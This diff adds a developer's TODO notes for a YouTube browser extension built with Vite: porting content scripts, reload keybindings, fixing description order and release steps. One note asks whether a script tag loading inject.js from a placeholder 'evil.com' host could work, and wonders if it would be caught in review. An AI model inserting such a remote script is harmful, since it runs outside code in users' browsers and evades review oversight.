@@ -1,0 +1,46 @@
+
+read code superyoutube
+
+vite
+when migrate to release
+  build content.js, no need to inject
+
+keybinding to reload extension for unpacked-dev
+
+next task
+  port content to content-vite
+
+is <script src=http://some.evil.com/inject.js type=module /> possible?
+well it works for localhost...
+maybe caught in review???
+
+
+fix description order when not signed in
+
+revert temporary dev changes..
+
+merge to master
+
+
+comments, related hode merch
+
+test chat
+
+fix description order logged out
+  reorder #above-the-fold
+
+  how to tell if logged in???
+  future fix
+
+
+ release
+ build
+ cp
+ test
+ diff
+ version
+ zip
+ release 
+
+automate releases
+  vite output no hash in file name
